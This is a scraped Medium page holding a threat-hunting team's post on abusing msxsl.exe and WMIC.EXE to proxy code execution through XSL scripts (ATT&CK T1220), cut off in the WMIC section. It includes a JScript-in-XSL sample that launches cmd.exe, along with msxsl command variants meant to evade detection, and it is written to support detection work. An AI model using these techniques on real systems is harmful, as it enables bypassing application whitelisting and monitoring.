src="https://miro.medium.com/max/270/1*W_RAPQ62h0em559zluJLdQ.png" width="135" height="41"/></a></div></div></div></div></div></div></div></div></div><script>window.__BUILD_ID__ = "main-20210521-194149-8205a38997"</script><script>window.__GRAPHQL_URI__ = "https://medium.com/_/graphql"</script><script>window.__PRELOADED_STATE__ = {"auroraPage":{"isAuroraPageEnabled":true},"bookReader":{"assets":{},"reader":{"currentAsset":null,"currentGFI":null,"settingsPanelIsOpen":false,"settings":{"fontFamily":"CHARTER","fontScale":"M","publisherStyling":true,"textAlignment":"start","theme":"White","lineSpacing":0,"wordSpacing":0,"letterSpacing":0},"internalNavCounter":0,"currentSelection":null,"highlights":[]}},"cache":{"experimentGroupSet":true,"reason":"","group":"enabled","tags":["group-edgeCachePosts","post-8d524f642b75","user-f7e306e00fce"],"serverVariantState":"695befac7073f94cb13e418dc8c7f73509c675aa939075e3d7530df3aabb45e6","middlewareEnabled":true,"cacheStatus":"DYNAMIC"},"client":{"hydrated":false,"isUs":false,"isNativeMedium":false,"isSafariMobile":false,"isSafari":false,"routingEntity":{"type":"DEFAULT","explicit":false}},"debug":{"requestId":"4501bd09-4862-4962-89c2-18b8c6ebbaa0","hybridDevServices":[],"showBookReaderDebugger":false,"originalSpanCarrier":{"ot-tracer-spanid":"5aa7773d4a695b09","ot-tracer-traceid":"3b16a10fc3ab3c22","ot-tracer-sampled":"true"}},"multiVote":{"clapsPerPost":{}},"navigation":{"branch":{"show":null,"hasRendered":null,"blockedByCTA":false},"hideGoogleOneTap":false,"hasRenderedGoogleOneTap":null,"hasRenderedAlternateUserBanner":null,"currentLocation":"https:\u002F\u002Fmedium.com\u002F@threathuntingteam\u002Fmsxsl-exe-and-wmic-exe-a-way-to-proxy-code-execution-8d524f642b75","host":"medium.com","hostname":"medium.com","referrer":"","hasSetReferrer":false,"susiModal":{"step":null,"operation":"register"},"postRead":false,"queryString":"","currentHash":""},"tracing":{},"config":{"nodeEnv":"production","version":"main-20210521-194149-8205a38997","isTaggedVersion":false,"target":"production","productName":"Medium","publicUrl":"https:\u002F\u002Fcdn-client.medium.com\u002Flite","authDomain":"medium.com","authGoogleClientId":"216296035834-k1k6qe060s2tp2a2jam4ljdcms00sttg.apps.googleusercontent.com","favicon":"production","glyphUrl":"https:\u002F\u002Fglyph.medium.com","branchKey":"key_live_ofxXr2qTrrU9NqURK8ZwEhknBxiI6KBm","lightStep":{"name":"lite-web","host":"lightstep.medium.systems","token":"ce5be895bef60919541332990ac9fef2","appVersion":"main-20210521-194149-8205a38997"},"algolia":{"appId":"MQ57UUUQZ2","apiKeySearch":"394474ced050e3911ae2249ecc774921","indexPrefix":"medium_","host":"-dsn.algolia.net"},"recaptchaKey":"6Lfc37IUAAAAAKGGtC6rLS13R1Hrw_BqADfS1LRk","recaptcha3Key":"6Lf8R9wUAAAAABMI_85Wb8melS7Zj6ziuf99Yot5","datadog":{"clientToken":"pub853ea8d17ad6821d9f8f11861d23dfed","context":{"deployment":{"target":"production","tag":"main-20210521-194149-8205a38997","commit":"8205a389970795cdb2c37068f2062c807d740019"}},"datacenter":"us"},"googleAnalyticsCode":"UA-24232453-2","googlePay":{"apiVersion":"2","apiVersionMinor":"0","merchantId":"BCR2DN6TV7EMTGBM","merchantName":"Medium"},"signInWallCustomDomainCollectionIds":["3a8144eabfe3","336d898217ee","61061eb0c96b","138adf9c44c","819cc2aaeee0"],"mediumOwnedAndOperatedCollectionIds":["8a9336e5bb4","b7e45b22fec3","193b68bd4fba","8d6b8a439e32","54c98c43354d","3f6ecf56618","d944778ce714","92d2092dc598","ae2a65f35510","1285ba81cada","544c7006046e","fc8964313712","40187e704f1c","88d9857e584e","7b6769f2748b","bcc38c8f6edf","cef6983b292","cb8577c9149e","444d13b52878","713d7dbc99b0","ef8e90590e66","191186aaafa0","55760f21cdc5","9dc80918cc93","bdc4052bbdba","8ccfed20cbb2"],"tierOneDomains":["medium.com","thebolditalic.com","arcdigital.media","towardsdatascience.com","uxdesign.cc","codeburst.io","psiloveyou.xyz","writingcooperative.com","entrepreneurshandbook.co","prototypr.io","betterhumans.coach.me","theascent.pub"],"topicsToFollow":["d61cf867d93f","8a146bc21b28","1eca0103fff3","4d562ee63426","aef1078a3ef5","e15e46793f8d","6158eb913466","55f1c20aba7a","3d18b94f6858","4861fee224fd","63c6f1f93ee","1d98b3a9a871","decb52b64abf","ae5d4995e225","830cded25262"],"defaultImages":{"avatar":{"imageId":"1*dmbNkD5D-u45r44go_cf0g.png","height":150,"width":150},"orgLogo":{"imageId":"1*OMF3fSqH8t4xBJ9-6oZDZw.png","height":106,"width":545},"postLogo":{"imageId":"1*kFrc4tBFM_tCis-2Ic87WA.png","height":810,"width":1440},"postPreviewImage":{"imageId":"1*hn4v1tCaJy7cWMyb0bpNpQ.png","height":386,"width":579}},"collectionStructuredData":{"8d6b8a439e32":{"name":"Elemental","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fcdn-images-1.medium.com\u002Fmax\u002F980\u002F1*9ygdqoKprhwuTVKUM0DLPA@2x.png","width":980,"height":159}}},"3f6ecf56618":{"name":"Forge","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fcdn-images-1.medium.com\u002Fmax\u002F596\u002F1*uULpIlImcO5TDuBZ6lm7Lg@2x.png","width":596,"height":183}}},"ae2a65f35510":{"name":"GEN","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F264\u002F1*RdVZMdvfV3YiZTw6mX7yWA.png","width":264,"height":140}}},"88d9857e584e":{"name":"LEVEL","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F540\u002F1*JqYMhNX6KNNb2UlqGqO2WQ.png","width":540,"height":108}}},"7b6769f2748b":{"name":"Marker","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fcdn-images-1.medium.com\u002Fmax\u002F383\u002F1*haCUs0wF6TgOOvfoY-jEoQ@2x.png","width":383,"height":92}}},"444d13b52878":{"name":"OneZero","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F540\u002F1*cw32fIqCbRWzwJaoQw6BUg.png","width":540,"height":123}}},"8ccfed20cbb2":{"name":"Zora","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F540\u002F1*tZUQqRcCCZDXjjiZ4bDvgQ.png","width":540,"height":106}}}},"embeddedPostIds":{"coronavirus":"cd3010f9d81f"},"sharedCdcMessaging":{"COVID_APPLICABLE_TAG_SLUGS":[],"COVID_APPLICABLE_TOPIC_NAMES":[],"COVID_APPLICABLE_TOPIC_NAMES_FOR_TOPIC_PAGE":[],"COVID_MESSAGES":{"tierA":{"text":"For more information on the novel coronavirus and Covid-19, visit cdc.gov.","markups":[{"start":66,"end":73,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]},"tierB":{"text":"Anyone can publish on Medium per our Policies, but we don’t fact-check every story. For more info about the coronavirus, see cdc.gov.","markups":[{"start":37,"end":45,"href":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Fcategories\u002F201931128-Policies-Safety"},{"start":125,"end":132,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]},"paywall":{"text":"This article has been made free for everyone, thanks to Medium Members. For more information on the novel coronavirus and Covid-19, visit cdc.gov.","markups":[{"start":56,"end":70,"href":"https:\u002F\u002Fmedium.com\u002Fmembership"},{"start":138,"end":145,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]},"unbound":{"text":"This article is free for everyone, thanks to Medium Members. For more information on the novel coronavirus and Covid-19, visit cdc.gov.","markups":[{"start":45,"end":59,"href":"https:\u002F\u002Fmedium.com\u002Fmembership"},{"start":127,"end":134,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]}},"COVID_BANNER_POST_ID_OVERRIDE_WHITELIST":["3b31a67bff4a"]},"sharedVoteMessaging":{"TAGS":["politics","election-2020","government","us-politics","election","2020-presidential-race","trump","donald-trump","democrats","republicans","congress","republican-party","democratic-party","biden","joe-biden","maga"],"TOPICS":["politics","election"],"MESSAGE":{"text":"Find out more about the U.S. election results here.","markups":[{"start":46,"end":50,"href":"https:\u002F\u002Fcookpolitical.com\u002F2020-national-popular-vote-tracker"}]},"EXCLUDE_POSTS":["397ef29e3ca5"]},"embedPostRules":[],"recircOptions":{"v1":{"limit":3},"v2":{"limit":8}},"braintreeClientKey":"production_zjkj96jm_m56f8fqpf7ngnrd4","paypalClientId":"AXj1G4fotC2GE8KzWX9mSxCH1wmPE3nJglf4Z2ig_amnhvlMVX87otaq58niAg9iuLktVNF_1WCMnN7v","stripePublishableKey":"pk_live_7FReX44VnNIInZwrIIx6ghjl"},"session":{"xsrf":""}}</script><script>window.__APOLLO_STATE__ = {"ROOT_QUERY":{"__typename":"Query","postResult({\"id\":\"8d524f642b75\"})":{"__ref":"Post:8d524f642b75"},"meterPost({\"postId\":\"8d524f642b75\",\"postMeteringOptions\":{\"referrer\":\"\",\"sk\":null,\"source\":null}})":{"__ref":"MeteringInfo:{}"}},"UserViewerEdge:userId:f7e306e00fce-viewerId:lo_aa350970d9dc":{"id":"userId:f7e306e00fce-viewerId:lo_aa350970d9dc","__typename":"UserViewerEdge","isAllowEdsEnabled":false,"isFollowing":false,"readPostsCount":0,"createdAt":0,"lastPostCreatedAt":0,"isBlocking":false,"isUser":false},"User:f7e306e00fce":{"id":"f7e306e00fce","__typename":"User","viewerIsUser":false,"viewerEdge":{"__ref":"UserViewerEdge:userId:f7e306e00fce-viewerId:lo_aa350970d9dc"},"customStyleSheet":null,"isSuspended":false,"name":"TH Team","hasCompletedProfile":false,"bio":"","imageId":"1*qV1BieB4TF-_fGB1KUUtuA.png","username":"threathuntingteam","customDomainState":null,"isAuroraVisible":true,"mediumMemberAt":0,"socialStats":{"__typename":"SocialStats","followerCount":75,"followingCount":1},"hasSubdomain":false,"allowNotes":true,"newsletterV3":null,"twitterScreenName":"hunting_threat","followedCollections":0,"atsQualifiedAt":1614229032027},"PostViewerEdge:postId:8d524f642b75-viewerId:lo_aa350970d9dc":{"id":"postId:8d524f642b75-viewerId:lo_aa350970d9dc","__typename":"PostViewerEdge","readingList":"READING_LIST_NONE","clapCount":0,"creatorPartnerProgramEnrollmentStatus":"PERMISSION_DENIED","shareKey":null},"Paragraph:85fe16ec578d_0":{"id":"85fe16ec578d_0","__typename":"Paragraph","name":"0b3a","text":"MSXSL.EXE AND WMIC.EXE — A Way to Proxy Code Execution","type":"H3","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:85fe16ec578d_1":{"id":"85fe16ec578d_1","__typename":"Paragraph","name":"5976","text":"INTRODUCTION","type":"H3","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:85fe16ec578d_2":{"id":"85fe16ec578d_2","__typename":"Paragraph","name":"9f04","text":"A few months ago, our friends at Mitre added 4 new techniques to the ATT&CK Framework that we quickly assessed. One of the new technique was “XSL Script Processing” (T1220) and while building detection for it we found some very interesting and not documented behaviors. This blog post intends to share the various findings we made during our experimentation with T1220.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[{"__typename":"Markup","start":69,"end":85,"type":"A","href":"https:\u002F\u002Fattack.mitre.org\u002F","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","start":166,"end":171,"type":"A","href":"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1220\u002F","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","start":363,"end":368,"type":"A","href":"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1220\u002F","anchorType":"LINK","userId":null,"linkMetadata":null}],"dropCapImage":null},"Paragraph:85fe16ec578d_3":{"id":"85fe16ec578d_3","__typename":"Paragraph","name":"3a04","text":"What is XSL Script Processing?","type":"H3","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:85fe16ec578d_4":{"id":"85fe16ec578d_4","__typename":"Paragraph","name":"8f8d","text":"XSL stands for Extensible Stylesheet Language and is used to express the style sheets. XSL is a standard for processing XML (Extensible Markup Language) data. XML is used for storing and transporting data and it does not do anything except this. Therefore, if we want to display content stored in XML document, we have to write a program to do so. One way of achieving this goal is to use XSL scripts as it can define how the content in XML document should be displayed on the screen. XSL is very flexible, so much so that it supports scripting in C#, VB, JScript, JavaScript and VisualBasic. If no language name is specified in XSL language attribute, then the default language is Jscript [3].","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:85fe16ec578d_5":{"id":"85fe16ec578d_5","__typename":"Paragraph","name":"724d","text":"Example: Here is a simple XML Document:","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:85fe16ec578d_6":{"id":"85fe16ec578d_6","__typename":"Paragraph","name":"8d90","text":"\u003Cnote\u003E\n\u003Cteam\u003EThreat Hunting Team\u003C\u002Fteam\u003E\n\u003CExpertise\u003E\nReverse Engineering, Penetration Testing Skills, Malware Analysis, Log Analysis, Red Team and Blue Team Operations\u003C\u002FExpertise\u003E\n\u003C\u002Fnote\u003E","type":"PRE","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:85fe16ec578d_7":{"id":"85fe16ec578d_7","__typename":"Paragraph","name":"0e3e","text":"Now we have an XML file which defines the skills for Threat Hunting Team. However, to display it, we need some kind of program or code.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:85fe16ec578d_8":{"id":"85fe16ec578d_8","__typename":"Paragraph","name":"da3a","text":"XSL — An Adversaries’ Favorite","type":"H3","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:85fe16ec578d_9":{"id":"85fe16ec578d_9","__typename":"Paragraph","name":"5b5d","text":"As previously mentioned, XSL contains code to do formatting on XML files, which means that it can be a way to execute code supply by an attacker. Due to its legitimate functionality, attackers can use XSL to bypass application whitelisting and execute arbitrary code.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:85fe16ec578d_10":{"id":"85fe16ec578d_10","__typename":"Paragraph","name":"5e07","text":"One way to execute code through XSL files is to use Microsoft’s command line transformation utility i.e.: msxsl.exe. This binary does not come pre-installed on Windows OS. Therefore, in order to take advantage of it, an adversary has to drop it on the system.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[{"__typename":"Markup","start":106,"end":115,"type":"STRONG","href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","start":106,"end":115,"type":"EM","href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"dropCapImage":null},"Paragraph:85fe16ec578d_11":{"id":"85fe16ec578d_11","__typename":"Paragraph","name":"671a","text":"However, there is another way to run JScript or VBScript code from XSL files. An attacker can use WMIC.EXE to invoke the code from XML file. WMIC.EXE comes pre-installed on all the Windows OS.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:85fe16ec578d_12":{"id":"85fe16ec578d_12","__typename":"Paragraph","name":"35a3","text":"Both, MSXSL.EXE and WMIC.EXE, can be used to invoke code from local or remote XSL file.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:85fe16ec578d_13":{"id":"85fe16ec578d_13","__typename":"Paragraph","name":"99ab","text":"Abusing XSL","type":"H3","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:85fe16ec578d_14":{"id":"85fe16ec578d_14","__typename":"Paragraph","name":"adcf","text":"In this section, we will discuss how Mitre has explained different ways to exploit this technique using MSXSL.EXE and WMIC.EXE and what we have found during our experiments. We will use the following XSL and XML files for the POC.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:85fe16ec578d_15":{"id":"85fe16ec578d_15","__typename":"Paragraph","name":"d91a","text":"testXML.xml","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[{"__typename":"Markup","start":0,"end":11,"type":"STRONG","href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","start":0,"end":11,"type":"EM","href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"dropCapImage":null},"Paragraph:85fe16ec578d_16":{"id":"85fe16ec578d_16","__typename":"Paragraph","name":"2a4f","text":"\u003C?xml version=\"1.0\"?\u003E\n\u003C?xml-stylesheet type=\"text\u002Fxsl\" href=\"TestXSL.xsl\" ?\u003E\n\u003CTEST\u003E\n\u003Cname\u003ETest XSL Scripting\u003C\u002Fname\u003E\n\u003C\u002FTEST","type":"PRE","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[{"__typename":"Markup","start":14,"end":19,"type":"STRONG","href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","start":44,"end":54,"type":"STRONG","href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","start":60,"end":73,"type":"STRONG","href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","start":90,"end":108,"type":"STRONG","href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"dropCapImage":null},"Paragraph:85fe16ec578d_17":{"id":"85fe16ec578d_17","__typename":"Paragraph","name":"5627","text":"testXSL.xsl","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[{"__typename":"Markup","start":0,"end":11,"type":"STRONG","href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","start":0,"end":11,"type":"EM","href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"dropCapImage":null},"Paragraph:85fe16ec578d_18":{"id":"85fe16ec578d_18","__typename":"Paragraph","name":"ff57","text":"\u003C?xml version='1.0'?\u003E\n\u003Cstylesheet xmlns=\"http:\u002F\u002Fwww.w3.org\u002F1999\u002FXSL\u002FTransform\" xmlns:ms=\"urn:schemas-microsoft-com:xslt\" xmlns:user=\"placeholder\" version=\"1.0\"\u003E\n\u003Coutput method=\"text\"\u002F\u003E\n\u003Cms:script implements-prefix=\"user\" language=\"JScript\"\u003E\n\u003C![CDATA[\nvar r = new ActiveXObject(\"WScript.Shell\").Run(\"cmd.exe\");\n]]\u003E \n\u003C\u002Fms:script\u003E\n\u003C\u002Fstylesheet\u003E","type":"PRE","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[{"__typename":"Markup","start":14,"end":19,"type":"STRONG","href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","start":40,"end":78,"type":"STRONG","href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","start":88,"end":121,"type":"STRONG","href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","start":132,"end":146,"type":"STRONG","href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","start":154,"end":159,"type":"STRONG","href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","start":176,"end":182,"type":"STRONG","href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","start":214,"end":220,"type":"STRONG","href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","start":230,"end":239,"type":"STRONG","href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","start":313,"end":315,"type":"STRONG","href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"dropCapImage":null},"Paragraph:85fe16ec578d_19":{"id":"85fe16ec578d_19","__typename":"Paragraph","name":"4043","text":"The code in XSL file spawns a new Command Shell. You could even get a reverse shell using XSL file.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:85fe16ec578d_20":{"id":"85fe16ec578d_20","__typename":"Paragraph","name":"de43","text":"MSXSL.EXE is a command line utility to perform transformation on XML files. This binary is used for debugging, development and reverse engineering. Attackers also can use this binary to proxy code execution [https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1220\u002F]. As per Mitre, this binary can be used to invoke code from local XSL file as follows:","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:85fe16ec578d_21":{"id":"85fe16ec578d_21","__typename":"Paragraph","name":"54f1","text":"1. Invoking code from local XSL file: Once you have saved the above code snippets, open cmd.exe and run the following command to invoke the code from XSL file as follows:","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[{"__typename":"Markup","start":3,"end":36,"type":"EM","href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"dropCapImage":null},"Paragraph:85fe16ec578d_22":{"id":"85fe16ec578d_22","__typename":"Paragraph","name":"1c5a","text":"C:\\Users\\Administrator\\Desktop\u003E msxsl.exe testXML.xml textXSL.xsl","type":"PRE","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:85fe16ec578d_23":{"id":"85fe16ec578d_23","__typename":"Paragraph","name":"3731","text":"","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*D-VjhwEVdnGHsyMw4qGeWg.png"},"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:85fe16ec578d_24":{"id":"85fe16ec578d_24","__typename":"Paragraph","name":"ce73","text":"As you can see from the above screenshot that new Command Shell has been spawned due to code in XSL File.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:85fe16ec578d_25":{"id":"85fe16ec578d_25","__typename":"Paragraph","name":"66a7","text":"As part of our team’s alert creation process, we always try to bypass our teammates signatures and find additional ways to perform the attack. Following are the different ways we have found to run code from XSL file:","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:85fe16ec578d_26":{"id":"85fe16ec578d_26","__typename":"Paragraph","name":"8095","text":"1. Providing more than two Parameters: Instead of passing just XML and XSL file, an attacker can pass more than two parameters by using “=” sign. The command to do so will be:","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[{"__typename":"Markup","start":0,"end":2,"type":"EM","href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","start":3,"end":39,"type":"EM","href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"dropCapImage":null},"Paragraph:85fe16ec578d_27":{"id":"85fe16ec578d_27","__typename":"Paragraph","name":"4628","text":"C:\\Users\\Administrator\\Desktop\\XSL\u003Emsxsl.exe TestXML.xml TestXSL.xsl TestXSL.xsl=TestXML.xml TestXSL.xsl=TestXML.xml","type":"PRE","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:85fe16ec578d_28":{"id":"85fe16ec578d_28","__typename":"Paragraph","name":"e5cd","text":"","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*14MYo7fy9O5hhg8XbNsLnA.png"},"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:85fe16ec578d_29":{"id":"85fe16ec578d_29","__typename":"Paragraph","name":"6ced","text":"2. Using XSL file instead of XML File: To evade detection based on type of parameters passed to MSXSL.EXE, to run the code, an attacker can pass XSL file instead of XML file as follows:","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[{"__typename":"Markup","start":0,"end":2,"type":"EM","href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","start":3,"end":39,"type":"EM","href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"dropCapImage":null},"Paragraph:85fe16ec578d_30":{"id":"85fe16ec578d_30","__typename":"Paragraph","name":"1fa4","text":"C:\\Users\\Administrator\\Desktop\\XSL\u003Emsxsl.exe TestXSL.xsl TestXSL.xsl","type":"PRE","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:85fe16ec578d_31":{"id":"85fe16ec578d_31","__typename":"Paragraph","name":"f0b0","text":"","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*ZLJLD44eDUMTSTtJVWlwGw.png"},"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:85fe16ec578d_32":{"id":"85fe16ec578d_32","__typename":"Paragraph","name":"f57c","text":"3. Renaming XSL file to arbitrary extension: Again, if defenders are monitoring file extensions passed to MSXSL.EXE, an attacker can rename XSL file to any extension and MSXSL.EXE will execute the code contained in XSL file, thus bypassing the detection. The reason why this works is that MSXSL.EXE looks at the header of the file to determine file type. Example of this attack is as follows:","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[{"__typename":"Markup","start":0,"end":2,"type":"EM","href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","start":3,"end":45,"type":"EM","href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"dropCapImage":null},"Paragraph:85fe16ec578d_33":{"id":"85fe16ec578d_33","__typename":"Paragraph","name":"cf98","text":"C:\\Users\\Administrator\\Desktop\\XSL\u003Emsxsl.exe TestXSL.jpeg TestXSL.jpeg","type":"PRE","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:85fe16ec578d_34":{"id":"85fe16ec578d_34","__typename":"Paragraph","name":"604c","text":"","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*sGJYLD6gKg81lNO2TyIwjw.png"},"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:85fe16ec578d_35":{"id":"85fe16ec578d_35","__typename":"Paragraph","name":"3ab5","text":"So, these are some of the additional ways that an attacker can use to perform code execution using MSXSL.EXE.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:85fe16ec578d_36":{"id":"85fe16ec578d_36","__typename":"Paragraph","name":"f7f3","text":"Code Execution through WMIC.EXE","type":"H3","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:85fe16ec578d_37":{"id":"85fe16ec578d_37","__typename":"Paragraph","name":"205c","text":"WMIC.EXE is the command line utility to use WMI (Windows Management Instrumentation). WMI is out of scope of this article, but it can be used to perform almost all the tasks on local or remote system (T1047). It is one of the favourite tools that attackers use for reconnaissance, code execution, lateral movement, 